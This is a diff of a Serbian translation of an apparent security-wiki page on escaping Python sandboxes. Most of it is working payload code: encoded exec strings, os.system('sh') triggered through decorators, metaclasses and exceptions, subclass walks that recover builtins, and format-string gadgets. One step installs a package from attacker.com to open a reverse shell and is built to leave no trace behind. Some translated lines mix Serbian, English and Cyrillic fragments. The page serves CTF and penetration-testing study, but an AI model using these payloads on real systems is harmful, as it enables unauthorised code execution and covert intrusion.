@@ -1,12 +1,13 @@
-# Bypass Python sandboxes
+# Zaobilaženje Python sandboxes
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Ovo su neki trikovi za zaobilaženje python sandbox zaštita i izvršavanje proizvoljnih komandi.
+Ovo su neki trikovi za zaobilaženje python sandbox zaštite i izvršavanje proizvoljnih komandi.
 
-## Command Execution Libraries
 
-Prva stvar koju treba da znate je da li možete direktno izvršiti kod pomoću neke već importovane biblioteke, ili da li možete importovati bilo koju od ovih biblioteka:
+## Biblioteke za izvršavanje komandi
+
+Prvo što treba da znaš je da li možeš direktno izvršiti code pomoću neke već importovane biblioteke, ili da li možeš import-ovati bilo koju od ovih biblioteka:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -39,21 +40,21 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.
+Zapamti da _**open**_ i _**read**_ funkcije mogu biti korisne za **čitanje fajlova** unutar python sandbox-a i za **pisanje koda** koji bi mogaoš **izvršiti** da **zaobiđeš** sandbox.
 
-> [!CAUTION] > **Python2 input()** funkcija dozvoljava izvršavanje python koda pre nego što se program sruši.
+> [!CAUTION] > **Python2 input()** function omogućava izvršavanje python code pre nego što se program sruši.
 
-Python pokušava prvo da **učita biblioteke iz trenutnog direktorijuma** (sledeća komanda će ispisati odakle python učitava module): `python3 -c 'import sys; print(sys.path)'`
+Python pokušava da prvo **učita biblioteke iz trenutnog direktorijuma** (sledeća komanda će ispisati odakle python učitava module): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../images/image (559).png>)
 
-## Zaobiđite pickle sandbox koristeći podrazumevane instalirane python pakete
+## Bypass pickle sandbox with the default installed python packages
 
-### Default packages
+### Podrazumevani paketi
 
-Možete pronaći **listu predinstaliranih** paketa ovde: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Imajte na umu da iz pickle-a možete naterati python env da **import arbitrary libraries** instalirane u sistemu.\
-For example, the following pickle, when loaded, is going to import the pip library to use it:
+Možeš pronaći **listu preinstaliranih** paketa ovde: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+Imaj na umu da iz pickle-a možeš naterati python env da **import arbitrary libraries** instalirane u sistemu.\
+Na primer, sledeći pickle, kada se učita, is going to import the pip library to use it:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -72,26 +73,26 @@ Za više informacija o tome kako pickle radi, pogledajte ovo: [https://checkoway
 
 Trik koji je podelio **@isHaacK**
 
-Ako imate pristup `pip` ili `pip.main()` možete instalirati proizvoljan paket i dobiti reverse shell pozivanjem:
+Ako imate pristup `pip` ili `pip.main()`, možete instalirati proizvoljan paket i dobiti reverse shell pozivom:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Možete preuzeti paket za kreiranje reverse shell-a ovde. Imajte na umu da pre upotrebe treba da ga **dekompresujete, izmenite `setup.py` i unesete vašu IP adresu za reverse shell**:
+Možete preuzeti paket za kreiranje reverse shell ovde. Imajte na umu da pre upotrebe treba da ga **dekompresujete, izmenite `setup.py` i stavite vašu IP za reverse shell**:
 
 {{#file}}
 Reverse.tar (1).gz
 {{#endfile}}
 
 > [!TIP]
-> Ovaj paket se zove `Reverse`. Međutim, on je posebno dizajniran tako da kada izađete iz reverse shell-a ostatak instalacije neće uspeti, pa tako nećete ostaviti nijedan dodatni python package instaliran na serveru kada odete.
+> Ovaj paket se zove `Reverse`. Međutim, on je posebno kreiran tako da kada izađete iz reverse shell ostatak instalacije zakaže, tako da **nećete ostaviti nijedan dodatni python package instaliran na serveru** kada odete.
 
 ## Eval-ing python code
 
 > [!WARNING]
-> Imajte na umu da exec dozvoljava multiline strings i ";", ali eval ne (proverite walrus operator)
+> Imajte na umu da exec dozvoljava višelinijske stringove i ";", ali eval ne (proverite walrus operator)
 
-Ako su određeni karakteri zabranjeni, možete koristiti **hex/octal/B64** reprezentaciju da **bypass** ograničenje:
+Ako su određeni karakteri zabranjeni, možete koristiti **hex/octal/B64** reprezentaciju da **zaobiđete** ograničenje:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -112,7 +113,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### Ostale biblioteke koje omogućavaju eval python koda
+### Ostale biblioteke koje omogućavaju eval python code
 ```python
 #Pandas
 import pandas as pd
@@ -126,9 +127,9 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
-Takođe pogledajte realan primer sandboxed evaluator escape-a u PDF generatorima:
+Takođe pogledaj stvarni slučaj bekstva iz sandboxovanog evaluatora u PDF generatorima:
 
-- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). Zloupotrebljava rl_safe_eval da dođe do function.__globals__ i os.system iz evaluiranih atributa (na primer, boja fonta) i vraća validnu vrednost kako bi renderovanje ostalo stabilno.
+- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). Zloupotrebljava rl_safe_eval da dođe do function.__globals__ i os.system kroz evaluirane atribute (na primer, boju fonta) i vraća validnu vrednost da bi renderovanje ostalo stabilno.
 
 {{#ref}}
 reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
@@ -145,7 +146,7 @@ reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
 ```
 ## Zaobilaženje zaštita kroz enkodiranja (UTF-7)
 
-U [**ovom writeupu**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 se koristi za učitavanje i izvršavanje proizvoljnog python koda unutar naizgled sandbox-a:
+U [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 se koristi za učitavanje i izvršavanje proizvoljnog python koda unutar navodnog sandbox-a:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -156,13 +157,13 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-Takođe je moguće zaobići ga koristeći druga kodiranja, npr. `raw_unicode_escape` i `unicode_escape`.
+Moguće je takođe zaobići to koristeći druga kodiranja, npr. `raw_unicode_escape` i `unicode_escape`.
 
 ## Izvršavanje u Pythonu bez poziva
 
-Ako se nalazite unutar Python jail-a koji **ne dozvoljava da pravite pozive**, i dalje postoje načini da **izvršite proizvoljne funkcije, code** i **commands**.
+Ako ste unutar python jail-a koji vam **ne dozvoljava da vršite pozive**, još uvek postoje načini da **izvršite proizvoljne funkcije, kod** i **komande**.
 
-### RCE sa [decorators](https://docs.python.org/3/glossary.html#term-decorator)
+### RCE pomoću [decorators](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 @exec
@@ -184,13 +185,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### RCE creating objects and overloading
+### RCE kreiranje objekata i preopterećenje
 
-Ako možete **declare a class** i **create an object** te klase, možete **write/overwrite different methods** koje se mogu **triggered** bez potrebe da ih pozivate direktno.
+Ako možete **deklarisati klasu** i **napraviti objekat** te klase, mogli biste **pisati/prepisivati različite metode** koje mogu biti **okidane** **bez** **potrebe da ih pozivate direktno**.
 
-#### RCE with custom classes
+#### RCE sa prilagođenim klasama
 
-Možete izmeniti neke **class methods** (_by overwriting existing class methods or creating a new class_) tako da prilikom **triggered** one **execute arbitrary code** bez direktnog poziva.
+Možete izmeniti neke **metode klase** (_prepisivanjem postojećih metoda klase ili kreiranjem nove klase_) da bi one **izvele proizvoljni kod** kada su **okinute**, bez direktnog poziva.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -240,9 +241,9 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
-#### Kreiranje objekata pomoću [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
+#### Kreiranje objekata sa [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-Ključna stvar koju metaclasses omogućavaju je **napraviti instancu klase, bez pozivanja konstruktora** direktno, kreiranjem nove klase koja koristi ciljnu klasu kao metaclass.
+Ključna stvar koju metaclasses omogućavaju je da **napravimo instancu klase, bez direktnog pozivanja konstruktora**, kreiranjem nove klase koja koristi ciljnu klasu kao metaklasu.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -257,9 +258,9 @@ Sub['import os; os.system("sh")']
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-#### Kreiranje objekata sa exceptions
+#### Kreiranje objekata pomoću exception-a
 
-Kada se **exception** pokrene, objekat **Exception** se **kreira** bez potrebe да директно позивате конструктор (trik od [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
+Kada se **exception** pokrene, objekat **Exception** se **kreira** bez potrebe da direktno pozivate konstruktor (trik od [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -301,7 +302,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Pročitaj fajl sa builtins help-om i licencom
+### Pročitaj fajl pomoću builtins help & license
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -310,22 +311,23 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
-## Ugrađene funkcije
+## Builtins
 
 - [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
 - [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
 
-Ako možete pristupiti objektu **`__builtins__`**, možete importovati biblioteke (imajte na umu da ovde takođe možete koristiti druge string reprezentacije prikazane u poslednjem odeljku):
+Ako možete pristupiti objektu **`__builtins__`** možete importovati biblioteke (primetite da ovde takođe možete koristiti druge string reprezentacije prikazane u poslednjem odeljku):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### Bez Builtins
 
-Kada nemaš `__builtins__` nećeš moći da importuješ bilo šta niti čak da čitaš ili pišeš fajlove jer **sve globalne funkcije** (kao `open`, `import`, `print`...) **nisu učitane**.\  
-Međutim, **po defaultu python učitava mnogo modula u memoriju**. Ti moduli mogu delovati bezopasno, ali neki od njih takođe u sebi importuju opasne funkcionalnosti kojima se može pristupiti da bi se čak dobilo **arbitrary code execution**.
+Kada nemaš `__builtins__`, nećeš moći ništa da importuješ niti čak da čitaš ili pišeš fajlove jer **sve globalne funkcije** (poput `open`, `import`, `print`...) **nisu učitane**.\
 
-U sledećim primerima možete videti kako se može **iskoristiti** neki od ovih "**bezopasnih**" modula koji su učitani da bi se **pristupilo** **opasnim** **funkcionalnostima** unutar njih.
+Međutim, **podrazumevano python učitava veliki broj modula u memoriju**. Ti moduli mogu delovati benigno, ali neki od njih takođe sadrže opasne funkcionalnosti kojima se može pristupiti i steći čak **arbitrary code execution**.
+
+U sledećim primerima možete videti kako **iskoristiti** neke od ovih "**benign**" modula koji su učitani da biste **pristupili** **opasnim** **funkcionalnostima** unutar njih.
 
 **Python2**
 ```python
@@ -367,9 +369,9 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Ispod se nalazi veća funkcija**](#recursive-search-of-builtins-globals) da pronađe desetine/**stotine** **mesta** gde možete pronaći **builtins**.
+[**Below there is a bigger function**](#recursive-search-of-builtins-globals) da pronađete desetine/**stotine** **mesta** gde možete naći **builtins**.
 
-#### Python2 i Python3
+#### Python2 and Python3
 ```python
 # Recover __builtins__ and make everything easier
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
@@ -383,9 +385,9 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## Globals and locals
+## Globals i locals
 
-Provera **`globals`** i **`locals`** je dobar način da proverite čemu možete pristupiti.
+Provera **`globals`** i **`locals`** je dobar način da saznate čemu možete pristupiti.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -409,15 +411,15 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Below there is a bigger function**](#recursive-search-of-builtins-globals) da pronađete desetine/**stotine** **mesta** gde možete pronaći **globals**.
+[**Below there is a bigger function**](#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **globals**.
 
-## Discover Arbitrary Execution
+## Otkrivanje proizvoljnog izvršavanja
 
-Ovde želim da objasnim kako lako otkriti **više opasnih funkcionalnosti koje su učitane** i predložiti pouzdanije exploits.
+Ovde želim da objasnim kako lako otkriti **opasnije učitane funkcionalnosti** i predložim pouzdanije exploits.
 
-#### Accessing subclasses with bypasses
+#### Pristup subclasses uz bypasses
 
-Jedan od najosetljivijih delova ove tehnike je mogućnost **pristupa base subclasses**. U prethodnim primerima ovo je urađeno korišćenjem `''.__class__.__base__.__subclasses__()` ali postoje **drugi mogući načini**:
+Jedan od najosetljivijih delova ove tehnike je mogućnost **pristupa base subclasses**. U prethodnim primerima ovo je urađeno koristeći `''.__class__.__base__.__subclasses__()` ali postoje **drugi mogući načini**:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -445,18 +447,18 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
-### Pronalaženje opasnih biblioteka koje su učitane
+### Pronalaženje opasnih učitanih biblioteka
 
-Na primer, znajući da uz biblioteku **`sys`** moguće je **uvoziti proizvoljne biblioteke**, možete pretražiti sve **učitane module koji su u njima importovali `sys`**:
+Na primer, znajući da je uz biblioteku **`sys`** moguće **import arbitrary libraries**, možete pretražiti sve **učitane module koji u sebi importuju `sys`**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-Ima ih mnogo, i **treba nam samo jedan** da izvršava komande:
+Ima ih mnogo, a **potreban nam je samo jedan** da izvrši komande:
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-Možemo isto uraditi i sa **other libraries** za koje znamo da se mogu koristiti za **execute commands**:
+Možemo isto to uraditi sa **drugim bibliotekama** za koje znamo da se mogu koristiti za **izvršavanje komandi**:
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -491,7 +493,7 @@ Možemo isto uraditi i sa **other libraries** za koje znamo da se mogu koristiti
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-Štaviše, mogli bismo čak i da pretražimo koji moduli učitavaju maliciozne biblioteke:
+Štaviše, mogli bismo čak i да pretražimo koji modules učitavaju malicious libraries:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -510,7 +512,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-Štaviše, ako mislite da **druge biblioteke** mogu da **pozovu funkcije za izvršavanje komandi**, možemo takođe **filtrirati po imenima funkcija** unutar potencijalnih biblioteka:
+Štaviše, ako mislite da **other libraries** mogu да **invoke functions to execute commands**, možemo такође да **filter by functions names** унутар могућих библиотеka:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -546,7 +548,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Rekurzivna pretraga Builtins, Globals...
 
 > [!WARNING]
-> Ovo je prosto **sjajno**. Ako ste **u potrazi za objektom poput globals, builtins, open ili bilo čega** samo koristite ovaj skript da **rekurzivno pronađete mesta gde možete pronaći taj objekat.**
+> Ovo je zaista **sjajno**. Ako tražite **objekat kao globals, builtins, open ili bilo šta drugo**, samo koristite ovu skriptu da **rekurzivno pronađete mesta gde možete naći taj objekat.**
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -662,7 +664,7 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
-Možete proveriti izlaz ovog skripta na ovoj stranici:
+You can check the output of this script on this page:
 
 
 {{#ref}}
@@ -671,7 +673,7 @@ https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-
 
 ## Python Format String
 
-Ako **pošaljete** **string** u python koji će biti **formatiran**, možete koristiti `{}` da pristupite **python internal information.** Možete koristiti prethodne primere da, na primer, pristupite globals ili builtins.
+Ako **pošaljete** **string** u python koji će biti **formatiran**, možete koristiti `{}` da pristupite **python internal information.** Možete koristiti prethodne primere da pristupite globals ili builtins.
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -691,16 +693,16 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Primetite kako možete **pristupiti atributima** na uobičajen način koristeći **tačku** kao `people_obj.__init__` i **dict element** sa **zagradama** bez navodnika `__globals__[CONFIG]`
+Obratite pažnju kako možete **pristupiti atributima** na uobičajen način koristeći **tačku** kao `people_obj.__init__` i **element dict-a** koristeći **uglaste zagrade** bez navodnika `__globals__[CONFIG]`
 
-Takođe imajte u vidu da možete koristiti `.__dict__` za nabrajanje elemenata objekta `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+Takođe obratite pažnju da možete koristiti `.__dict__` za nabrajanje elemenata objekta `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Još neke zanimljive karakteristike format strings su mogućnost izvršavanja funkcija `str`, `repr` i `ascii` nad označenim objektom dodavanjem `!s`, `!r`, `!a` respektivno:
+Još neke zanimljive karakteristike format stringova su mogućnost **izvršavanja** **funkcija** **`str`**, **`repr`** i **`ascii`** nad naznačenim objektom dodavanjem **`!s`**, **`!r`**, **`!a`** respektivno:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Štaviše, moguće je **code new formatters** u klasama:
+Štaviše, moguće je **kodirati nove formatere** u klasama:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -711,10 +713,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Više primera** o **format** **string** primerima možete pronaći na [**https://pyformat.info/**](https://pyformat.info)
+**Više primera** o **format** **string** primerima mogu se naći na [**https://pyformat.info/**](https://pyformat.info)
 
 > [!CAUTION]
-> Proverite i sledeću stranicu za gadgets koji će r**čitati osetljive informacije iz Python internih objekata**:
+> Proverite takođe sledeću stranicu za gadgets koji će p**ročitati osetljive informacije iz Python internih objekata**:
 
 
 {{#ref}}
@@ -741,18 +743,18 @@ str(x) # Out: clueless
 
 Iz [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
-### From format to RCE loading libraries
+### Od format string do RCE kroz učitavanje biblioteka
 
-According to the [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/) moguće je učitati proizvoljne biblioteke sa diska zloupotrebljavajući format string vulnerability u python.
+Prema [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/) moguće je učitati proizvoljne biblioteke sa diska zloupotrebom format string vulnerability u pythonu.
 
-Kao podsetnik, svaki put kad se izvrši neka akcija u python neki funkcija se poziva. Na primer `2*3` će izvršiti **`(2).mul(3)`** ili **`{'a':'b'}['a']`** će biti **`{'a':'b'}.__getitem__('a')`**.
+Kao podsetnik, svaki put kada se u pythonu izvrši neka radnja, pozove se odgovarajuća funkcija. Na primer `2*3` će izvršiti **`(2).mul(3)`** ili **`{'a':'b'}['a']`** će biti **`{'a':'b'}.__getitem__('a')`**.
 
-Više ovakvih primera imaš u sekciji [**Python execution without calls**](#python-execution-without-calls).
+Više ovakvih primera nalazi se u sekciji [**Python execution without calls**](#python-execution-without-calls).
 
-A python format string vuln ne dozvoljava izvršavanje funkcije (ne dozvoljava korišćenje zagrada), tako da nije moguće dobiti RCE kao `'{0.system("/bin/sh")}'.format(os)`.\\
+Python format string vuln ne dozvoljava izvršavanje funkcije (ne dozvoljava upotrebu zagrada), pa nije moguće dobiti RCE kao `'{0.system("/bin/sh")}'.format(os)`.\
 Međutim, moguće je koristiti `[]`. Dakle, ako neka uobičajena python biblioteka ima **`__getitem__`** ili **`__getattr__`** metodu koja izvršava proizvoljan kod, moguće ih je zloupotrebiti da se dobije RCE.
 
-Tražeći gadget poput ovog u python, writeup predlaže ovu [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Gde je pronašao ovaj [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
+Tražeći takav gadget u pythonu, writeup predlaže ovaj [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Gde je našao ovaj [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -774,20 +776,20 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-Ovaj gadget omogućava da **učitate biblioteku sa diska**. Stoga je potrebno na neki način **zapisati ili otpremiti biblioteku koja će se učitati**, pravilno kompajliranu za napadnuti server.
+Ovaj gadget omogućava da se **učita biblioteka sa diska**. Stoga je potrebno na neki način **upisati ili otpremiti biblioteku koja će se učitati**, pravilno kompajlovanu, na napadnuti server.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-Izazov zapravo zloupotrebljava drugu ranjivost na serveru koja omogućava kreiranje proizvoljnih fajlova na disku servera.
+Zadatak zapravo iskorišćava drugu ranjivost na serveru koja omogućava kreiranje proizvoljnih fajlova na disku servera.
 
 ## Analiza Python objekata
 
 > [!TIP]
-> Ako želite da **naučite** o **python bytecode** detaljno, pročitajte ovaj **sjajan** post o toj temi: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> Ako želite detaljno da **naučite** o **python bytecode**, pročitajte ovaj **sjajan** post o toj temi: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-U nekim CTF-ovima može vam biti dato ime **custom function where the flag** u kojoj se nalazi flag, i potrebno je da pogledate **internals** te **function** kako biste ga izvukli.
